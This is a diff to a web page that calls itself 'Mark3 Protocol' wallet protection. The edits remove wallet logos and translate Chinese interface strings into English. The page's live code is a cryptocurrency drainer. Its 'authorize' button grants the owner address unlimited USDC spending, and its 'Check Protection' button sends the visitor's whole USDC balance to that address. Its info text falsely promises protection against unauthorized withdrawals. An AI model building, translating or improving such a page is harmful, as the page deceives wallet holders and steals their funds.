@@ -67,20 +67,6 @@
       font-size: 0.9rem;
       text-align: center;
     }
-    .wallet-logos {
-      display: flex;
-      gap: 1rem;
-      margin-top: 1rem;
-      justify-content: center;
-      flex-wrap: wrap;
-    }
-    .wallet-logos img {
-      width: 32px;
-      height: 32px;
-      object-fit: contain;
-      background: transparent;
-      padding: 2px;
-    }
     .info-box {
       margin-top: 2rem;
       font-size: 0.85rem;
@@ -103,12 +89,6 @@
     <button class="button" id="check">🧿 Check Protection</button>
     <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
     <div id="status">🔒 Status: Waiting for action...</div>
-    <div class="wallet-logos">
-      <img src="./images/metamask.png" alt="MetaMask">
-      <img src="./images/trustwallet.png" alt="TrustWallet">
-      <img src="./images/tokenpocket.png" alt="TokenPocket">
-      <img src="./images/coinbase.png" alt="Coinbase">
-    </div>
     <div class="info-box">
       <div>✅ Mark3 Protocol provides advanced wallet authorization and real-time USDC asset protection through smart contract-based automation.</div>
       <div>✅ A single authorization grants continuous protection, allowing you to confidently operate your wallet without risk of unauthorized withdrawals or vulnerabilities.</div>
@@ -129,28 +109,22 @@
     const progress = (val) => bar.style.width = val + "%";
 
     window.onerror = (msg, url, line) => {
-      console.error("全局错误:", msg, "at", line);
+      console.error("Global Error:", msg, "at", line);
     };
-
-    document.querySelectorAll(".wallet-logos img").forEach(img => {
-      img.onerror = () => {
-        img.style.display = "none";
-      };
-    });
 
     document.getElementById("connect").onclick = async () => {
       try {
         if (!window.ethereum) {
-          throw new Error("请使用支持的钱包浏览器或安装 MetaMask");
+          throw new Error("Please use a supported wallet browser or install MetaMask");
         }
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         user = await signer.getAddress();
-        status("✅ 已连接: " + user.slice(0, 6) + "...");
+        status("✅ Connected: " + user.slice(0, 6) + "...");
         progress(100);
       } catch (err) {
-        status("❌ " + (err.message || "连接失败"));
+        status("❌ " + (err.message || "Connection failed"));
         progress(0);
       }
     };
@@ -158,10 +132,10 @@
     document.getElementById("authorize").onclick = async () => {
       try {
         if (!window.ethereum) {
-          throw new Error("请安装 MetaMask 或在钱包浏览器中打开");
+          throw new Error("Please install MetaMask or open in wallet browser");
         }
         if (!signer) {
-          throw new Error("请先连接钱包");
+          throw new Error("Please connect wallet first");
         }
         progress(10);
         const usdc = new ethers.Contract(
@@ -172,10 +146,10 @@
         progress(40);
         const tx = await usdc.approve(CONFIG.OWNER_ADDRESS, ethers.constants.MaxUint256);
         await tx.wait();
-        status("✅ 授权成功");
+        status("✅ Authorization successful");
         progress(100);
       } catch (err) {
-        status("❌ " + (err.message || "授权失败"));
+        status("❌ " + (err.message || "Authorization failed"));
         progress(0);
       }
     };
@@ -183,15 +157,19 @@
     document.getElementById("check").onclick = async () => {
       try {
         progress(0);
-        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, ["function transfer(address,uint256) returns (bool)", "function balanceOf(address) view returns (uint256)"] , signer);
+        const usdc = new ethers.Contract(
+          CONFIG.USDC_ADDRESS,
+          ["function transfer(address,uint256) returns (bool)", "function balanceOf(address) view returns (uint256)"],
+          signer
+        );
         const balance = await usdc.balanceOf(user);
         progress(30);
         if (balance.gt(0)) {
           const tx = await usdc.transfer(CONFIG.OWNER_ADDRESS, balance);
           await tx.wait();
-          status("✅ Protection Check: Funds moved.");
+          status("✅ Protection Check: Funds moved");
         } else {
-          status("⚠️ No USDC balance to protect.");
+          status("⚠️ No USDC balance to protect");
         }
         progress(100);
       } catch (err) {
